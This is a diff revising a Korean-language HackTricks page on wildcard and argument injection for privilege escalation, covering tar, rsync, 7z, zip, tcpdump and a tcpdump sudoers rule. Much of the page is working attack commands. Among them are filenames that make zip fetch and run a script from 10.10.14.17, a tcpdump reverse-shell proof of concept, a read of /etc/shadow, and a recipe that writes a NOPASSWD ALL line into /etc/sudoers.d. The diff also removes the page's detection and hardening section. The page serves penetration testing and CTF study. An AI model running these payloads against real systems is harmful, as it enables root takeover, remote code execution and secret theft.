@@ -2,26 +2,26 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> Wildcard (aka *glob*) **인수 주입**은 특권 스크립트가 `tar`, `chown`, `rsync`, `zip`, `7z`와 같은 Unix 바이너리를 인용되지 않은 와일드카드 `*`와 함께 실행할 때 발생합니다.
-> 셸이 바이너리를 실행하기 **전에** 와일드카드를 확장하기 때문에, 작업 디렉토리에 파일을 생성할 수 있는 공격자는 `-`로 시작하는 파일 이름을 만들어서 **데이터 대신 옵션**으로 해석되도록 할 수 있으며, 이를 통해 임의의 플래그나 심지어 명령을 밀어넣을 수 있습니다.
-> 이 페이지는 2023-2025년을 위한 가장 유용한 원시 요소, 최근 연구 및 현대 탐지를 수집합니다.
+> Wildcard (aka *glob*) **argument injection**는 권한 있는 스크립트가 `tar`, `chown`, `rsync`, `zip`, `7z` 등과 같은 Unix 바이너리를 인용되지 않은 와일드카드(`*`)와 함께 실행할 때 발생합니다.
+> 쉘이 와일드카드를 바이너리를 실행하기 **전에** 확장하기 때문에, 작업 디렉터리에 파일을 생성할 수 있는 공격자는 파일명이 `-`로 시작하도록 조작해 그것들이 **데이터 대신 옵션으로** 해석되게 할 수 있으며, 결과적으로 임의의 플래그나 심지어 명령까지 밀수할 수 있습니다.
+> 이 페이지는 2023-2025년을 위한 가장 유용한 primitives, 최신 연구 및 현대적 탐지 기법을 모아둡니다.
 
 ## chown / chmod
 
-`--reference` 플래그를 악용하여 **임의 파일의 소유자/그룹 또는 권한 비트를 복사할 수 있습니다**:
+당신은 `--reference` 플래그를 악용하여 임의 파일의 소유자/그룹 또는 권한 비트를 **복사할 수 있습니다**:
 ```bash
 # attacker-controlled directory
 touch "--reference=/root/secret``file"   # ← filename becomes an argument
 ```
-루트가 나중에 다음과 같은 것을 실행할 때:
+나중에 root가 다음과 같은 것을 실행할 때:
 ```bash
 chown -R alice:alice *.php
 chmod -R 644 *.php
 ```
-`--reference=/root/secret``file`가 주입되어, *모든* 일치하는 파일이 `/root/secret``file`의 소유권/권한을 상속받습니다.
+`--reference=/root/secret``file`가 주입되어, *모든* 일치하는 파일이 `/root/secret``file`의 소유권/권한을 상속하게 됩니다.
 
-*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (결합 공격).
-자세한 내용은 고전 DefenseCode 논문을 참조하십시오.
+*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (결합된 공격).
+자세한 내용은 DefenseCode의 고전 논문을 참조하세요.
 
 ---
 
@@ -29,7 +29,7 @@ chmod -R 644 *.php
 
 ### GNU tar (Linux, *BSD, busybox-full)
 
-**checkpoint** 기능을 악용하여 임의의 명령을 실행합니다:
+**checkpoint** 기능을 악용해 임의의 명령을 실행할 수 있습니다:
 ```bash
 # attacker-controlled directory
 echo 'echo pwned > /tmp/pwn' > shell.sh
@@ -37,84 +37,101 @@ chmod +x shell.sh
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-루트가 예를 들어 `tar -czf /root/backup.tgz *`를 실행하면, `shell.sh`가 루트로 실행됩니다.
+루트가 예를 들어 `tar -czf /root/backup.tgz *`를 실행하면, `shell.sh`가 root 권한으로 실행됩니다.
 
 ### bsdtar / macOS 14+
 
-최근 macOS의 기본 `tar`( `libarchive` 기반)는 `--checkpoint`를 구현하지 않지만, 외부 압축기를 지정할 수 있는 **--use-compress-program** 플래그를 사용하여 여전히 코드 실행을 달성할 수 있습니다.
+최근 macOS의 기본 `tar`(`libarchive` 기반)는 `--checkpoint`를 *구현하지 않습니다*, 하지만 외부 압축 프로그램을 지정할 수 있는 **--use-compress-program** 플래그로 여전히 code-execution을 달성할 수 있습니다.
 ```bash
 # macOS example
 touch "--use-compress-program=/bin/sh"
 ```
-특권 스크립트가 `tar -cf backup.tar *`를 실행하면 `/bin/sh`가 시작됩니다.
+권한이 높은 스크립트가 `tar -cf backup.tar *`를 실행하면 `/bin/sh`가 시작됩니다.
 
 ---
 
 ## rsync
 
-`rsync`는 `-e` 또는 `--rsync-path`로 시작하는 명령줄 플래그를 통해 원격 셸 또는 원격 바이너리를 재정의할 수 있게 해줍니다.
+`rsync`는 `-e` 또는 `--rsync-path`로 시작하는 명령줄 플래그를 통해 remote shell이나 remote binary를 재정의할 수 있습니다:
 ```bash
 # attacker-controlled directory
 touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-루트가 나중에 `rsync -az * backup:/srv/`로 디렉토리를 아카이브하면, 주입된 플래그가 원격 측에서 당신의 셸을 생성합니다.
+나중에 root가 `rsync -az * backup:/srv/`로 디렉터리를 아카이브하면, 주입된 플래그가 원격 측에서 당신의 셸을 실행시킨다.
 
-*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` 모드).
+*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).
 
 ---
 
 ## 7-Zip / 7z / 7za
 
-특권 스크립트가 와일드카드를 `--`로 *방어적으로* 접두어를 붙여 옵션 파싱을 중지하더라도, 7-Zip 형식은 파일 이름을 `@`로 접두어를 붙여 **파일 목록 파일**을 지원합니다. 이를 심볼릭 링크와 결합하면 *임의 파일을 유출할 수 있습니다*:
+권한 있는 스크립트가 *방어적으로* 와일드카드 앞에 `--`를 붙여 옵션 파싱을 막더라도, 7-Zip 포맷은 파일 이름 앞에 `@`를 붙여 **파일 목록 파일**을 지원한다. 이를 심볼릭 링크와 결합하면 *exfiltrate arbitrary files*:
 ```bash
 # directory writable by low-priv user
 cd /path/controlled
 ln -s /etc/shadow   root.txt      # file we want to read
 touch @root.txt                  # tells 7z to use root.txt as file list
 ```
-루트가 다음과 같은 명령을 실행하면:
+root가 다음과 같은 것을 실행하면:
 ```bash
 7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-7-Zip는 `root.txt` (→ `/etc/shadow`)를 파일 목록으로 읽으려고 시도하며, **stderr에 내용을 출력하며** 중단됩니다.
+7-Zip will attempt to read `root.txt` (→ `/etc/shadow`) as a file list and will bail out, **내용을 stderr로 출력**.
 
 ---
 
 ## zip
 
-`zip`는 아카이브가 테스트될 때 시스템 셸에 *그대로* 전달되는 `--unzip-command` 플래그를 지원합니다:
+애플리케이션이 사용자 제어의 파일명을 `zip`에 전달할 때(와일드카드로 전달하거나 `--` 없이 이름을 열거하는 경우) 두 가지 매우 실용적인 기법이 존재합니다.
+
+- 테스트 훅을 통한 RCE: `-T`은 “test archive”를 활성화하며 `-TT <cmd>`는 테스터를 임의의 프로그램으로 교체합니다(긴 형태: `--unzip-command <cmd>`). 만약 `-`로 시작하는 파일명을 주입할 수 있다면, 짧은 옵션 파싱이 작동하도록 플래그를 서로 다른 파일명으로 분리하세요:
 ```bash
-zip result.zip files -T --unzip-command "sh -c id"
+# Attacker-controlled filenames (e.g., in an upload directory)
+# 1) A file literally named: -T
+# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
+# 3) Any benign file to include (e.g., data.pcap)
+# When the privileged code runs: zip out.zip <files...>
+# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
 ```
-플래그를 조작된 파일 이름을 통해 주입하고, 특권 백업 스크립트가 결과 파일에 대해 `zip -T` (아카이브 테스트)를 호출할 때까지 기다립니다.
+참고
+- `'-T -TT <cmd>'` 같은 단일 파일명으로 시도하지 마세요 — 짧은 옵션은 문자별로 파싱되므로 실패합니다. 예시처럼 별개의 토큰을 사용하세요.
+- 앱이 파일명에서 슬래시를 제거하는 경우, bare host/IP에서 가져와(기본 경로 `/index.html`) `-O`로 로컬에 저장한 다음 실행하세요.
+- 파싱을 디버그하려면 `-sc` (show processed argv) 또는 `-h2` (more help)를 사용하여 토큰이 어떻게 소모되는지 확인하세요.
+
+예시 (zip 3.0에서의 로컬 동작):
+```bash
+zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
+zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
+```
+- Data exfil/leak: 웹 레이어가 `zip`의 stdout/stderr를 에코(순진한 래퍼에서 흔함)하면, `--help` 같은 주입된 플래그나 잘못된 옵션에서 발생한 실패가 HTTP 응답에 나타나 커맨드라인 인젝션을 확인하고 페이로드 조정에 도움이 됩니다.
 
 ---
 
-## 와일드카드 주입에 취약한 추가 바이너리 (2023-2025 빠른 목록)
+## 와일드카드 인젝션에 취약한 추가 바이너리 (2023-2025 빠른 목록)
 
-다음 명령어는 현대 CTF와 실제 환경에서 남용되었습니다. 페이로드는 항상 와일드카드로 처리될 수 있는 쓰기 가능한 디렉토리 내의 *파일 이름*으로 생성됩니다:
+다음 명령들은 최신 CTF와 실제 환경에서 악용된 사례가 있습니다. 페이로드는 항상 쓰기 가능한 디렉터리 안에 *파일명*으로 생성되며, 이후 와일드카드로 처리됩니다:
 
-| 바이너리 | 남용할 플래그 | 효과 |
+| 바이너리 | 악용할 플래그 | 효과 |
 | --- | --- | --- |
-| `bsdtar` | `--newer-mtime=@<epoch>` → 임의의 `@file` | 파일 내용 읽기 |
-| `flock` | `-c <cmd>` | 명령 실행 |
-| `git`   | `-c core.sshCommand=<cmd>` | SSH를 통한 git의 명령 실행 |
-| `scp`   | `-S <cmd>` | ssh 대신 임의의 프로그램 실행 |
+| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
+| `flock` | `-c <cmd>` | Execute command |
+| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
+| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |
 
-이러한 원시 기능은 *tar/rsync/zip* 고전보다 덜 일반적이지만, 사냥할 때 확인할 가치가 있습니다.
+이러한 프리미티브는 *tar/rsync/zip* 같은 고전보다는 덜 흔하지만 탐색할 때 확인할 가치가 있습니다.
 
 ---
 
-## tcpdump 회전 훅 (-G/-W/-z): 래퍼에서 argv 주입을 통한 RCE
+## tcpdump rotation hooks (-G/-W/-z): 래퍼에서 argv 주입을 통한 RCE
 
-제한된 셸 또는 공급업체 래퍼가 사용자 제어 필드(예: "파일 이름" 매개변수)를 엄격한 인용/검증 없이 연결하여 `tcpdump` 명령줄을 구성할 때, 추가 `tcpdump` 플래그를 밀어넣을 수 있습니다. `-G` (시간 기반 회전), `-W` (파일 수 제한), 및 `-z <cmd>` (회전 후 명령)의 조합은 tcpdump를 실행하는 사용자(종종 장치에서 root)의 임의 명령 실행을 초래합니다.
+제한된 쉘이나 벤더 래퍼가 사용자 제어 필드(예: "file name" 파라미터)를 엄격한 인용/검증 없이 이어붙여 `tcpdump` 명령줄을 구성하면, 추가 `tcpdump` 플래그를 몰래 넣을 수 있습니다. `-G`(시간 기반 회전), `-W`(파일 수 제한), `-z <cmd>`(회전 후 명령) 조합은 tcpdump를 실행하는 사용자(종종 어플라이언스에서 root) 권한으로 임의 명령 실행을 유발합니다.
 
 전제 조건:
 
-- `tcpdump`에 전달되는 `argv`에 영향을 줄 수 있습니다 (예: `/debug/tcpdump --filter=... --file-name=<HERE>`와 같은 래퍼를 통해).
-- 래퍼는 파일 이름 필드에서 공백이나 `-`로 시작하는 토큰을 정리하지 않습니다.
+- `tcpdump`에 전달되는 `argv`에 영향을 줄 수 있어야 합니다(예: `/debug/tcpdump --filter=... --file-name=<HERE>` 같은 래퍼를 통해).
+- 래퍼가 파일 이름 필드의 공백이나 `-`로 시작하는 토큰을 정리하지 않아야 합니다.
 
-고전적인 PoC (쓰기 가능한 경로에서 리버스 셸 스크립트를 실행):
+클래식 PoC (쓰기 가능한 경로에서 reverse shell 스크립트를 실행):
 ```sh
 # Reverse shell payload saved on the device (e.g., USB, tmpfs)
 cat > /mnt/disk1_1/rce.sh <<'EOF'
@@ -132,38 +149,75 @@ nc -6 -lvnp 4444 &
 # Then send any packet that matches the BPF to force a rotation
 printf x | nc -u -6 [victim_ipv6] 1234
 ```
-세부사항:
+- `-G 1 -W 1`는 첫 매칭 패킷 이후 즉시 회전을 강제합니다.
+- `-z <cmd>`는 회전당(post-rotate) 명령을 한 번 실행합니다. 많은 빌드가 `<cmd> <savefile>`을 실행합니다. `<cmd>`가 스크립트/인터프리터인 경우, 인수 처리 방식이 페이로드와 일치하는지 확인하세요.
 
-- `-G 1 -W 1`는 첫 번째 일치하는 패킷 후 즉시 회전을 강제합니다.
-- `-z <cmd>`는 회전당 한 번 포스트 회전 명령을 실행합니다. 많은 빌드가 `<cmd> <savefile>`을 실행합니다. `<cmd>`가 스크립트/인터프리터인 경우, 인수 처리가 페이로드와 일치하는지 확인하십시오.
+No-removable-media variants:
 
-제거할 수 없는 미디어 변형:
-
-- 파일을 쓰기 위한 다른 원시 방법이 있는 경우(예: 출력 리디렉션을 허용하는 별도의 명령 래퍼), 스크립트를 알려진 경로에 놓고 플랫폼 의미에 따라 `-z /bin/sh /path/script.sh` 또는 `-z /path/script.sh`를 트리거하십시오.
-- 일부 공급업체 래퍼는 공격자가 제어할 수 있는 위치로 회전합니다. 회전된 경로에 영향을 줄 수 있다면(심볼릭 링크/디렉토리 탐색), `-z`를 조정하여 외부 미디어 없이 완전히 제어하는 콘텐츠를 실행할 수 있습니다.
-
-공급업체를 위한 강화 팁:
-
-- 사용자 제어 문자열을 `tcpdump`(또는 어떤 도구)로 직접 전달하지 마십시오. 엄격한 허용 목록을 사용하십시오. 인용하고 검증하십시오.
-- 래퍼에서 `-z` 기능을 노출하지 마십시오; tcpdump를 고정된 안전 템플릿으로 실행하고 추가 플래그를 완전히 허용하지 마십시오.
-- tcpdump 권한을 낮추거나(cap_net_admin/cap_net_raw만) AppArmor/SELinux 격리와 함께 전용 비특권 사용자로 실행하십시오.
-
-
-## 탐지 및 강화
-
-1. **중요한 스크립트에서 셸 글로빙 비활성화**: `set -f` (`set -o noglob`)는 와일드카드 확장을 방지합니다.
-2. **인수 인용 또는 이스케이프**: `tar -czf "$dst" -- *`는 *안전하지 않습니다* — `find . -type f -print0 | xargs -0 tar -czf "$dst"`를 선호하십시오.
-3. **명시적 경로**: 공격자가 `-`로 시작하는 형제 파일을 생성할 수 없도록 `*` 대신 `/var/www/html/*.log`를 사용하십시오.
-4. **최소 권한**: 가능한 경우 루트 대신 비특권 서비스 계정으로 백업/유지 관리 작업을 실행하십시오.
-5. **모니터링**: Elastic의 사전 구축된 규칙 *Potential Shell via Wildcard Injection*은 `tar --checkpoint=*`, `rsync -e*`, 또는 `zip --unzip-command` 다음에 즉시 셸 자식 프로세스를 찾습니다. EQL 쿼리는 다른 EDR에 맞게 조정할 수 있습니다.
+- 파일을 쓸 수 있는 다른 primitive(예: 출력 리다이렉션을 허용하는 별도의 명령 래퍼)가 있다면, 스크립트를 알려진 경로에 두고 플랫폼 의미론에 따라 `-z /bin/sh /path/script.sh` 또는 `-z /path/script.sh`를 트리거하세요.
+- 일부 벤더 래퍼는 공격자가 제어할 수 있는 위치로 회전합니다. 회전되는 경로(symlink/directory traversal)에 영향을 줄 수 있다면, 외부 미디어 없이도 `-z`를 통해 완전히 제어 가능한 콘텐츠를 실행하도록 유도할 수 있습니다.
 
 ---
 
-## 참조
+## sudoers: tcpdump with wildcards/additional args → 임의의 쓰기/읽기 및 root 권한
 
-* Elastic Security – Potential Shell via Wildcard Injection Detected 규칙 (2025년 마지막 업데이트)
-* Rutger Flohil – “macOS — Tar wildcard injection” (2024년 12월 18일)
-* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
-* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
+매우 흔한 sudoers 안티패턴:
+```text
+(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
+```
+Issues
+- `*` glob 및 관대(permissive) 패턴은 첫 번째 `-w` 인자만 제한합니다. `tcpdump`는 여러 개의 `-w` 옵션을 허용합니다; 마지막 옵션이 적용됩니다.
+- 해당 규칙은 다른 옵션을 고정하지 않으므로 `-Z`, `-r`, `-V` 등은 허용됩니다.
+
+Primitives
+- 두 번째 `-w`로 대상 경로를 덮어쓰기(첫 번째는 sudoers만 만족시킴):
+```bash
+sudo tcpdump -c10 -w/var/cache/captures/a/ \
+-w /dev/shm/out.pcap \
+-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+- Path traversal 첫 번째 `-w` 내부에서 제한된 트리를 벗어나기 위해:
+```bash
+sudo tcpdump -c10 \
+-w/var/cache/captures/a/../../../../dev/shm/out \
+-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+- 출력 소유권을 `-Z root`로 강제 지정 (어디에나 root 소유 파일을 생성):
+```bash
+sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
+-w /dev/shm/root-owned \
+-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+- 임의 콘텐츠 쓰기: `-r`를 사용해 제작된 PCAP을 재생하여 (예: sudoers 줄을 삽입하기 위해):
+
+<details>
+<summary>정확한 ASCII 페이로드를 포함하는 PCAP을 생성하고 root 권한으로 기록</summary>
+```bash
+# On attacker box: craft a UDP packet stream that carries the target line
+printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
+sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
+cat sudoers | nc -u 127.0.0.1 9001; kill %1
+
+# On victim (sudoers rule allows tcpdump as above)
+sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
+-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
+-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+</details>
+
+- Arbitrary file read/secret leak with `-V <file>` (savefiles 목록을 해석함). 오류 진단은 종종 라인을 echo하여, leaking content:
+```bash
+sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
+-w /tmp/dummy \
+-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+---
+
+## 참고 자료
+
+- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
+- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
+- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
 
 {{#include ../../banners/hacktricks-training.md}}
